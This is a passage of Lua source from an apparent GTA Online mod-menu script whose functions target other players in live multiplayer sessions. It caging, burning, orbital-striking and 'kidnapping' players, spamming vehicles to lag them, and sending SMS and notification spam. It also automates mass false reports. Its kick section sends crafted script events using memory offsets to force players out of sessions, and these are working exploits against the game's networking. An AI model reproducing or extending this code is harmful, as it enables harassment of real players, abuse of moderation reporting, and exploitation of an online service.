			local ba = {x = b.x - a.x, y = b.y - a.y, z = b.z - a.z} 
			if math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z) >= 4 then --now I know there's a native to find distance between coords but I like this >_<
				a = b
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					goto continue
				end
				cage_player(a)
				notification(PLAYER.GET_PLAYER_NAME(pid).." was out of the cage. Doing it again", colors.red)
				::continue::
			end
			util.yield(1000)
		end
	end)



	
menu.action(cage_options, "Slowly Burn Them To Death", {}, "use this to slowly kill the poor caged person (ONLY WORKS WITH SOME CAGES)", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("prop_beach_fire")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do
		STREAMING.REQUEST_MODEL(hash)	
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1.75, true, true, false) -- front

	cages[#cages + 1] = cage_object

	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
end)


	menu.action(cage_options, "Release Player", {"release"}, "Attempts to delete spawned cages, for more complicated traps it will delete one side.", function() -- ez fix but lazy
		for key, value in pairs(cages) do
			entities.delete_by_handle(value)
		end
	end)

local function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end


	orbliterate = menu.list(griefing, "Orbliterate", {"orbliterate"}, "")

	menu.action(orbliterate, "Orbliterate", {}, "Press once to target, twice to fire. Stop spectating to cancel :)", function(on_click)
        	if pid ~= players.user() then
			if waiting then
				do_fade_in(pid)
				notification("Click again to fire!", colors.red)
				return 
			end
			waiting = true
			if not NETWORK.NETWORK_IS_IN_SPECTATOR_MODE() then
				do_fade_in(pid)
				return
			end
			util.toast("FIRE!")
			orbital(pid) 
			do_fade_out(pid)
		end
			
    	end)

	menu.action(orbliterate, "Unfuck Orbliterate", {"unfuckorbliterate"}, "If you somehow get it stuck, try this to undo it", function(on_click)
		do_fade_out(pid)
	end)

	menu.action(griefing, "Monkey Drop", {"monkeytroll"}, "", function()
		PlayerName = PLAYER.GET_PLAYER_NAME(pid)
		
		local hash = util.joaat("a_c_chimp")
		while not STREAMING.HAS_MODEL_LOADED(hash) do
			STREAMING.REQUEST_MODEL(hash)
			util.yield()
		end
		for i = 1, 69 do
			PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			MonkeCoords = {
				["x"] = PlayerCoords.x,
				["y"] = PlayerCoords.y,
				["z"] = PlayerCoords.z + 3
			}
			entities.create_ped(28, hash, MonkeCoords, 0)
			util.yield(50)
		end
	end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(griefing,"Volatol Spam Player", {}, "spams volatols on target player, huge AOE", function() -- cpu burn simulator v2
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) --save location
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

		notification("Started lagging the fuck out of him", colors.red)
		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		notification("Done", colors.red) -- cpu burned congrats
		menu.trigger_commands("anticrashcamera off")
	end)
----------------------------------------------------------------------------------------------------------------------- attacker buzzard --------------------------------------------------------

	local gunner_weapon_list = {              --these are the buzzard's gunner weapons 
	{"Combat MG", "weapon_combatmg"},
	{"RPG", "weapon_rpg"}
}

buzzard_entities = {}
function spawn_buzzard(pid, gunner_weapon, collision)
	local player_ped =  PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
	pos.x = pos.x + math.random(-20, 20)
	pos.y = pos.y + math.random(-20, 20)
	pos.z = pos.z + math.random(20, 40)

	PED.SET_PED_RELATIONSHIP_GROUP_HASH(player_ped, util.joaat("PLAYER"))

	local heli_hash = util.joaat("buzzard2")
	local ped_hash = util.joaat("s_m_y_blackops_01")
	STREAMING.REQUEST_MODEL(ped_hash)
	STREAMING.REQUEST_MODEL(heli_hash)
	while not STREAMING.HAS_MODEL_LOADED(ped_hash) or not STREAMING.HAS_MODEL_LOADED(heli_hash) do
		util.yield()
	end
	local heli = entities.create_vehicle(heli_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
	buzzard_entities[#buzzard_entities + 1] = heli
	
	if not collision then
		VEHICLE._DISABLE_VEHICLE_WORLD_COLLISION(heli)
	end
	
	ENTITY.SET_ENTITY_INVINCIBLE(heli, buzzard_godmode)
	ENTITY.SET_ENTITY_VISIBLE(heli, buzzard_visible, 0)	
	VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
	VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
		
	local pilot = entities.create_ped(5, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
	buzzard_entities[#buzzard_entities + 1] = pilot
	
	PED.SET_PED_RELATIONSHIP_GROUP_HASH(pilot, util.joaat("ARMY"))
	ENTITY.SET_ENTITY_VISIBLE(pilot, buzzard_visible, 0)
	PED.SET_PED_INTO_VEHICLE(pilot, heli, -1)
	PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pilot, true)

	PED.SET_PED_MAX_HEALTH(pilot, 500)
	ENTITY.SET_ENTITY_HEALTH(pilot, 500)
	ENTITY.SET_ENTITY_INVINCIBLE(pilot, buzzard_godmode)
	--TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(pilot, 500, 0)

	local gunner = {}
	for i  = 1,2 do
		gunner[i] = entities.create_ped(29, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
		buzzard_entities[#buzzard_entities + 1] = gunner[i]
		PED.SET_PED_INTO_VEHICLE(gunner[i], heli, i)
		WEAPON.GIVE_WEAPON_TO_PED(gunner[i], util.joaat(gunner_weapon) , 9999, false, true)
		PED.SET_PED_COMBAT_ATTRIBUTES(gunner[i], 20 --[[ they can shoot from vehicle ]], true)
		--PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(gunner[i], true)
		PED.SET_PED_MAX_HEALTH(gunner[i], 500)
		ENTITY.SET_ENTITY_HEALTH(gunner[i], 500)
		ENTITY.SET_ENTITY_INVINCIBLE(gunner[i], buzzard_godmode)
		ENTITY.SET_ENTITY_VISIBLE(gunner[i], buzzard_visible, 0)
		PED.SET_PED_SHOOT_RATE(gunner[i], 1000)
		PED.SET_PED_RELATIONSHIP_GROUP_HASH(gunner[i], util.joaat("ARMY"))
		TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(gunner[i], 1000, 0)
	end
	
	util.create_tick_handler(function()
		PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("ARMY"), util.joaat("PLAYER"))
		PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("PLAYER"), util.joaat("ARMY"))
		PED.SET_RELATIONSHIP_BETWEEN_GROUPS(0, util.joaat("ARMY"), util.joaat("ARMY"))
	end)

	notification("Buzzard sent to "..PLAYER.GET_PLAYER_NAME(pid), colors.red)
	return pilot, heli
	end	

	local buzzard_options = menu.list(griefing, "Enemy Buzzard", {}, "")

	menu.divider(buzzard_options, "Enemy Buzzard")

	buzzard_visible = true
	local gunner_weapon = "weapon_combatmg"
	
	menu.action(buzzard_options, "Spawn Buzzard", {}, "", function()
		local pilot, heli = spawn_buzzard(pid, gunner_weapon, collision)

		while ENTITY.GET_ENTITY_HEALTH(pilot) > 0 do
			local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
			local a = ENTITY.GET_ENTITY_COORDS(player_ped)
			local b = ENTITY.GET_ENTITY_COORDS(heli)
			if MISC.GET_DISTANCE_BETWEEN_COORDS(a.x, a.y, a.z, b.x, b.y, b.z, true) > 90 then
				TASK.TASK_HELI_CHASE(pilot, player_ped, 0, 0, 50)
			else
				TASK.TASK_HELI_MISSION(pilot, heli, 0, player_ped, a.x, a.y, a.z, 23, 30, -1, -1, 10, 10, 5, 0)
			end
			util.yield()
		end
	end)

	menu.divider(buzzard_options, "Settings")

	menu.toggle(buzzard_options, "Invincible", {}, "", function(on)
		buzzard_godmode = on
	end, false)
	
	local menu_gunner_weapon_list = menu.list(buzzard_options, "Gunners Weapon")
	menu.divider(menu_gunner_weapon_list, "Gunner Weapon List")

	for i = 1, #gunner_weapon_list do
		menu.action(menu_gunner_weapon_list, gunner_weapon_list[i][1], {}, "", function()
			gunner_weapon = gunner_weapon_list[i][2]
			notification("Now gunners will shoot with "..gunner_weapon_list[i][1].."s", colors.red)
		end)
	end

	menu.toggle(buzzard_options, "Visible", {}, "You shouldn't be that toxic to turn this off", function(on)
		buzzard_visible = on
	end, true)

	menu.toggle(buzzard_options, "Collision", {}, "When it's turned off disables world collision for Buzzard. Playes can still destroy the vehicle", function(on)
		collision = on
	end, false)

	menu.action(buzzard_options, "Delete All", {}, "Deletes all Buzzards you've spawned", function()
		for key, value in pairs(buzzard_entities) do
			entities.delete_by_handle(value)
		end
	end)

	menu.action(griefing,"Spawn Attacker Tank", {}, "", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		if table_kidnap == nil then
			table_kidnap = {}
		end
        hash = util.joaat("rhino")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do

                util.yield()
            end

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, false)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
                                              CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)

            coords_ped = v3()
            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
            coords_ped.x = coords_ped.x + math.random(-20, 20)
            coords_ped.y = coords_ped.y + math.random(-20, 20)
            coords_ped.z = coords_ped.z

            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)

            VEHICLE.SET_VEHICLE_ENGINE_ON(table_kidnap[veh_to_attach], true, true, false)
            TASK.TASK_VEHICLE_SHOOT_AT_PED(ped_to_drive, V3, 1)
            TASK.TASK_VEHICLE_CHASE(ped_to_drive, V3)

            util.yield(1)
            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)

            --util.toast(os.date("%H:%M:%S") .. " DONE", TOAST_ABOVE_MAP)
        end
	end)

	menu.action(griefing,"Kidnap Player", {}, "", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		if table_kidnap == nil then
			table_kidnap = {}
		end

        hash = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)

            util.yield(500)

            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)

            --util.toast(os.date("%H:%M:%S") .. " DONE", TOAST_ABOVE_MAP)

        end
	end)

	menu.action(griefing,"Deliver Player to you", {"deliver"}, "Kidnaps the target and brings them to your current location", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		if table_kidnap == nil then
			table_kidnap = {}
		end

        hash = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}


            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
			local PlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
			local PedCoords = ENTITY.GET_ENTITY_COORDS(PlayerPed)
            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            --TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)
			TASK.TASK_VEHICLE_DRIVE_TO_COORD(ped_to_drive, table_kidnap[veh_to_attach], PedCoords.x, PedCoords.y, PedCoords.z, 30, 1, hash, 4, 5, 0)

            util.yield(500)

            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)

            --util.toast(os.date("%H:%M:%S") .. " DONE", TOAST_ABOVE_MAP)

        end
	end)

	menu.action(griefing,"Ban Voice Chat", {}, "May lag your game when in progress", function(on)
		if pid ~= players.user() then
			for i = 1, 30 do
				menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
				util.yield()
			end
		end
	end)

	menu.toggle(griefing,"Report Spam", {}, "May lag your game when in progress", function(on)
		spam = on
		while spam do
			if pid ~= players.user() then
				menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
			end
			util.yield()
		end
	end)

	menu.toggle(griefing,"Commend Spam", {}, "May lag your game when in progress", function(on)
		spam = on
		while spam do
			if pid ~= players.user() then
				menu.trigger_commands("commendfriendly " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("commendhelpful " .. PLAYER.GET_PLAYER_NAME(pid))
			end
			util.yield()
		end
	end)

-----------------------------------------------------------------------------------------------------------------------------------------

	crash = menu.list(menu.player_root(pid), "Crashes", {}, "Currupt Crash", function(); end)
	kick = menu.list(menu.player_root(pid), "Kicks", {}, "Network Bail", function(); end)


        menu.action(kick, "Block Kick", {"block"}, "Blocks the player join reaction then uses breakup kick", function()
        notification("Block kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("historyblock " .. players.get_name(pid))
            menu.trigger_commands("breakup" .. players.get_name(pid))
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

        menu.action(kick, "Boop Kick", {"boop"}, "Kicks the player using a SE kick like breakup kick but uses 3 types of SE kicks then 3 more new ones if they don't work", function()
            util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, -1, 1, 1, 1})
            util.trigger_script_event(1 << pid, {0x6A16C7F, pid, memory.script_global(0x2908D3 + 1 + (pid * 0x1C5) + 0x13E + 0x7)})
            util.trigger_script_event(1 << pid, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
            menu.trigger_commands("breakup" .. players.get_name(pid))
            util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, -1, 1, 1, 1})
            util.trigger_script_event(1 << pid, {0x6A16C7F, pid, memory.script_global(0x2908D3 + 1 + (pid * 0x1C5) + 0x13E + 0x7)})
            util.trigger_script_event(1 << pid, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(kick, "Desync Kick", {"desynckick"}, "Desyncs the player from the session", function()
    notification("Desycn kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        util.trigger_script_event(1 << pid, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(kick, "Storymode Kick", {"storymode"}, "Sends them to storymode", function()
    notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        util.trigger_script_event(1 << pid, {111242367, pid, memory.script_global(2689235 + 1 + (pid * 453) + 318 + 7)})
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(kick, "Invalid Figure Kick", {"figurekick"}, "Drops invalid figures on player causing them to be kicked, also gives them rp and a lot of notifications with errors.", function(on_toggle)
        util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, -1, 1, 1, 1})
    end)

    menu.action(kick, "SE kick v1", {"kickv1"}, "", function()
    notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        util.trigger_script_event(1 << pid, {111242367, pid, -210634234})
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(kick, "SE kick v2", {"kickv2"}, "", function()
    notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        util.trigger_script_event(1 << pid, {421832664, pid, 0, 1951261, 829})
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(kick, "SE kick v3", {"kickv3"}, "", function()
    notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        util.trigger_script_event(1 << pid, {0xB9BA4D30, PlayerID, 0x4, -1, 1, 1, 1})
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(kick, "SE kick v4", {"kickv4"}, "", function()
    notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        util.trigger_script_event(1 << pid, {603406648, 0, 380565701, -1443464333, 1, 115, 954851592, -768074745, 1278027916})
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(kick, "SE kick v5", {"kickv5"}, "", function()
    notification("Storymode kick sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        util.trigger_script_event(1 << pid, {603406648, 0, 1279476345, 655005918, 1, 115, 1997628673, 6299376, -302416007})
    	end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.divider(kick, "Stand Kicks")

    	menu.action(kick, "Smart", {"kick"}, "Removes the player by any means necessary.", function()
	menu.trigger_commands("kick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Buttplug", {"buttplug"}, "Unblockable when you are the host.", function()
	menu.trigger_commands("buttplug"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Breakup", {"breakup"}, "A discrete kick that won't tell the target who did it.", function()
	menu.trigger_commands("breakup"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Confusion", {"confusion"}, "Can't be blocked without consequences, but the target might karma you for using it.", function()
	menu.trigger_commands("confusion"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Love Letter", {"loveletterkick"}, "A discrete kick that won't tell the target who did it. Unblockable when you are the host.", function()
	menu.trigger_commands("loveletterkick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Orgasm", {"orgasmkick"}, "Blocked by popular menus.", function()
	menu.trigger_commands("orgasmkick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Blacklist", {"blacklist"}, "Adds the player to the blacklist like they were vote kicked, but kicks them like a desync. Only available when you are the host.", function()
	menu.trigger_commands("blacklist"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Host", {"hostkick"}, "Kicks the player using the vote kick mechanism. Unblockable when you are the host, but you might be karma'd for it.", function()
	menu.trigger_commands("hostkick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Non-Host", {"nonhostkick"}, "Kicks the player using script events. Blocked by most menus.", function()
	menu.trigger_commands("nonhostkick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)

    	menu.action(kick, "Invalid Pickup", {"pickupkick"}, "Block by most menus.", function()
	menu.trigger_commands("pickupkick"..PLAYER.GET_PLAYER_NAME(pid))
    			end)


	local WeakCrash = {
		"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
	}

                       menu.toggle_loop(griefing, "SmS Spam", {}, "Might Work On Pussy's Fam", function(on_toggle)
		menu.trigger_commands("smstext" .. PLAYER.GET_PLAYER_NAME(pid).. " " .. WeakCrash[math.random(1, #WeakCrash)])
		util.yield()
		menu.trigger_commands("smssend" .. PLAYER.GET_PLAYER_NAME(pid))
	end)
	
                       menu.toggle(griefing, "Notify Spam", {}, "", function(on_toggle)
	if on then
		menu.trigger_commands("notifyspam" .. PLAYER.GET_PLAYER_NAME(pid).. " " .. WeakCrash[math.random(1, #WeakCrash)])
	else
		menu.trigger_commands("notifyspam" .. PLAYER.GET_PLAYER_NAME(pid))
		end
	end)
        
	passivemode = menu.list(griefing, "Passive Mode", {}, "", function(); end)

	menu.action(passivemode,"Block", {}, "", function()
		if players.exists(pid) then
			send_script_event(1114091621, pid, {pid, 1})
			send_script_event(1859990871, pid, {pid, 1})
		end
	end)

	menu.action(passivemode,"Unblock", {}, "", function()
		if players.exists(pid) then
			send_script_event(1114091621, pid, {pid, 0})
			send_script_event(2033772643, pid, {pid, 0})
		end
	end)

	menu.action(griefing, "Spectate", {"spec"}, "", function()
    	notification("Spectating " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid))
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
		end
	end)


    		local frienm = menu.list(menu.player_root(pid), 'Friendly', {}, '')

	menu.action(frienm, "Protect Player", {"max"}, "Turns on auto heal, never wanted, gives all weapons, ammo and parachute all at once", function ()
    	notification("Protecting " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		menu.trigger_commands("bail".. players.get_name(pid))
        		menu.trigger_commands("autoheal".. players.get_name(pid))
        		menu.trigger_commands("arm".. players.get_name(pid))
        		menu.trigger_commands("ammo".. players.get_name(pid))
        		menu.trigger_commands("paragive".. players.get_name(pid))
	notification("PROTECTED!!! GANG SHIT!!!", colors.red)
    	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm, "Teleport To Them", {"tp"}, "", function()
	menu.trigger_commands("tp" .. players.get_name(pid))
	end, nil, nil, COMMANDPERM_AGGRESSIVE)

	menu.action(frienm, "Teleport To Me", {"tpme"}, "", function()
	menu.trigger_commands("summon" .. players.get_name(pid))
	end, nil, nil, COMMANDPERM_AGGRESSIVE)

            local player_torque = 1000
            menu.slider(frienm, 'Set Torque', {'torque'}, 'Modifies the speed of their vehicle.', -1000000, 1000000, player_torque, 1000, function(value)
                player_torque = value
                util.create_tick_handler(function()
                    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
                        local playerVehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(playerVehicle)
                        VEHICLE.SET_VEHICLE_CHEAT_POWER_INCREASE(playerVehicle, player_torque/1000)
                    end
                    return (player_torque ~= 1000)
                end, nil, nil, COMMANDPERM_FRIENDLY)
            end)

	menu.action(frienm,"Drift Mode", {"driftmode"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_REDUCE_GRIP(vehicle, 100)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)


	menu.action(frienm,"Boost", {"boost"}, "Sets max speed of vehicle to 100 better for cars",function()
       	notification("100x vehicle speed boost for  " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 100)
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm,"Currupt boost", {"Currupt boost"}, "Sets max speed of vehicle to 9999999 better for bikes",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 9999999) 
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

	menu.action(frienm,"Reset Speed", {"resetacc"}, "Resets max speed of vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 1) 
		end
	end, nil, nil, COMMANDPERM_FRIENDLY)

